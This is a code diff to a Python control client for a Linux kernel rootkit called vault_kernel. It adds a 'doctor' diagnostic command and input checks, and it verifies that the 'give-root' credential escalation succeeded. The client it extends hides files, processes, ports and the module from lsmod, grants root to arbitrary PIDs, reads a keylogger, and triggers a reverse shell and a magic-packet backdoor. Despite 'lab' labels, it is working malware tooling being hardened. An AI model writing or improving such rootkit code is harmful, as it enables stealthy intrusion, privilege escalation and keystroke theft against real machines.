@@ -23,10 +23,12 @@ Commands:
     unhide-module         Make rootkit visible in lsmod
     reset                 Clear ALL hidden files, PIDs and ports
     status                Check if rootkit is loaded and show info
+    doctor                Diagnose module/client state (lab sanity check)
 """
 
 import os
 import sys
+import stat as stat_mod
 import struct
 import fcntl
 import errno
@@ -34,6 +36,8 @@ import argparse
 
 MAGIC = 0xC0
 DEVICE_PATH = "/dev/vault_kernel"
+SYSFS_MODULE = "/sys/module/vault_kernel"
+CLIENT_VERSION = "3.4"
 
 
 def _port_arg(value):
@@ -99,6 +103,121 @@ def magic_pid(word: str, port: int) -> int:
     return (port << 16) | fnv1a16(word)
 
 
+def _proc_euid(pid):
+    """Effective uid of pid read from /proc/<pid>/status, or None."""
+    try:
+        with open(f"/proc/{pid}/status") as fh:
+            for line in fh:
+                if line.startswith("Uid:"):
+                    fields = line.split()
+                    if len(fields) >= 3:
+                        return int(fields[2])
+    except (OSError, ValueError):
+        pass
+    return None
+
+
+def _reject(condition, message):
+    """Fail fast with a clear error instead of silently truncating
+    the value inside the kernel's fixed-size buffers."""
+    if condition:
+        raise SystemExit(f"[-] {message}")
+
+
+def run_doctor():
+    """Lab sanity checks: device node, permissions, stats ABI, hook
+    count, client/module version match, stealth state and every
+    read-only control interface. Exits non-zero only when the module
+    is unreachable; warnings do not fail."""
+    print("[*] vault_kernel doctor — lab diagnostics")
+    print()
+    warnings = 0
+
+    try:
+        st = os.stat(DEVICE_PATH)
+    except OSError:
+        print(f"  [FAIL] {DEVICE_PATH} not found — module is not loaded")
+        print("         Load it first: sudo insmod vault_kernel.ko")
+        raise SystemExit(1)
+    print(f"  [ OK ] device {DEVICE_PATH} present "
+          f"(mode {stat_mod.filemode(st.st_mode)})")
+
+    try:
+        fd = os.open(DEVICE_PATH, os.O_RDWR)
+    except OSError as e:
+        print(f"  [FAIL] cannot open {DEVICE_PATH}: {e}")
+        print("         EACCES/EPERM → run with sudo "
+              "(module also rejects non-root since v3.4).")
+        raise SystemExit(1)
+
+    try:
+        print("  [ OK ] device opens read/write")
+
+        def raw(request, buf):
+            try:
+                fcntl.ioctl(fd, request, buf)
+                return None
+            except OSError as e:
+                return e
+
+        buf = bytearray(4096)
+        e = raw(IOCTL_GET_STATS, buf)
+        if e is not None:
+            print(f"  [FAIL] GET_STATS failed: {e}")
+            if e.errno == errno.ENOTTY:
+                print("         ENOTTY → client and module versions are out of sync.")
+            raise SystemExit(1)
+        stats = {}
+        for line in buf.rstrip(b'\x00').decode(errors='replace').splitlines():
+            line = line.strip()
+            if '=' in line:
+                key, _, value = line.partition('=')
+                stats[key] = value
+        print("  [ OK ] GET_STATS responds")
+        print(f"         module version : {stats.get('version')}")
+        print(f"         uptime_s       : {stats.get('uptime_s')}")
+
+        if stats.get('version') and stats['version'] != CLIENT_VERSION:
+            print(f"  [WARN] client v{CLIENT_VERSION} != module v{stats['version']} "
+                  "— ioctl ABI may differ")
+            warnings += 1
+
+        hooks = stats.get('hooks_installed')
+        if hooks is not None:
+            if hooks == '0':
+                print("  [WARN] 0 syscall hooks installed — hiding features are inactive")
+                warnings += 1
+            else:
+                print(f"  [ OK ] {hooks}/{stats.get('hooks_planned')} syscall hooks installed")
+
+        if not os.path.isdir(SYSFS_MODULE):
+            print("  [INFO] module not in /sys/module — hidden from lsmod/sysfs")
+        else:
+            print("  [INFO] module visible in /sys/module — not hidden")
+
+        e = raw(IOCTL_KEYLOG_READ, bytearray(4096))
+        if e is not None:
+            print(f"  [WARN] KEYLOG_READ failed: {e}")
+            warnings += 1
+        else:
+            print("  [ OK ] keylog interface responds")
+
+        e = raw(IOCTL_LIST_HIDDEN, bytearray(4096))
+        if e is not None:
+            print(f"  [WARN] LIST_HIDDEN failed: {e}")
+            warnings += 1
+        else:
+            print("  [ OK ] list interface responds")
+
+        print()
+        if warnings:
+            print(f"[*] doctor finished with {warnings} warning(s)")
+        else:
+            print("[*] doctor finished: everything OK")
+    finally:
+        os.close(fd)
+
+
 class VaultKernelClient:
     def __init__(self):
         self.fd = None
@@ -140,10 +259,27 @@ class VaultKernelClient:
         self._open()
         pid_buf = struct.pack("i", pid)
         if self._ioctl(IOCTL_GIVE_ROOT, pid_buf):
-            print(f"[+] Granted root to PID {pid if pid else os.getpid()}")
+            if pid in (0, os.getpid()):
+                # The module ran commit_creds() on our own task — verify it.
+                if os.geteuid() == 0:
+                    print(f"[+] Granted root to PID {pid if pid else os.getpid()} "
+                          "(verified: euid=0)")
+                else:
+                    print("[?] ioctl succeeded but euid is unchanged — check dmesg")
+            else:
+                print(f"[+] Granted root to PID {pid}")
+                euid = _proc_euid(pid)
+                if euid == 0:
+                    print(f"    Verified via /proc/{pid}/status: euid=0")
+                else:
+                    print(f"    (could not verify euid via /proc/{pid}/status)")
         self._close()
 
     def hide_file(self, name):
+        _reject(not name, "file name cannot be empty")
+        _reject(len(name.encode()) > 255,
+                f"name too long ({len(name.encode())} bytes): "
+                "the kernel hide-list stores at most 255")
         self._open()
         buf = name.encode().ljust(256, b'\x00')
         if self._ioctl(IOCTL_HIDE_FILE, buf):
@@ -151,6 +287,10 @@ class VaultKernelClient:
         self._close()
 
     def unhide_file(self, name):
+        _reject(not name, "file name cannot be empty")
+        _reject(len(name.encode()) > 255,
+                f"name too long ({len(name.encode())} bytes): "
+                "the kernel hide-list stores at most 255")
         self._open()
         buf = name.encode().ljust(256, b'\x00')
         if self._ioctl(IOCTL_UNHIDE_FILE, buf):
@@ -195,6 +335,9 @@ class VaultKernelClient:
 
     def shell(self, target):
         """Trigger reverse shell to IP:PORT."""
+        _reject(len(target.encode()) > 255,
+                f"target too long ({len(target.encode())} bytes): "
+                "kernel buffer stores at most 255")
         self._open()
         buf = target.encode().ljust(256, b'\x00')
         if self._ioctl(IOCTL_BACKDOOR_SHELL, buf):
@@ -203,6 +346,10 @@ class VaultKernelClient:
 
     def set_magic(self, word):
         """Set magic packet trigger word for kill() backdoor."""
+        _reject(not word, "magic word cannot be empty")
+        _reject(len(word.encode()) > 15,
+                f"magic word too long ({len(word.encode())} chars): "
+                "module stores at most 15")
         self._open()
         buf = word.encode().ljust(16, b'\x00')
         if self._ioctl(IOCTL_BACKDOOR_MAGIC, buf):
@@ -293,6 +440,7 @@ def main():
     subparsers = parser.add_subparsers(dest="command", help="Available commands")
 
     subparsers.add_parser("status", help="Check if rootkit is loaded")
+    subparsers.add_parser("doctor", help="Diagnose module/client state (lab sanity check)")
 
     sp = subparsers.add_parser("give-root", help="Escalate process to root")
     sp.add_argument("pid", nargs="?", type=int, default=0,
@@ -349,6 +497,8 @@ def main():
     try:
         if args.command == "status":
             client.status()
+        elif args.command == "doctor":
+            run_doctor()
         elif args.command == "give-root":
             client.give_root(args.pid)
         elif args.command == "hide-file":
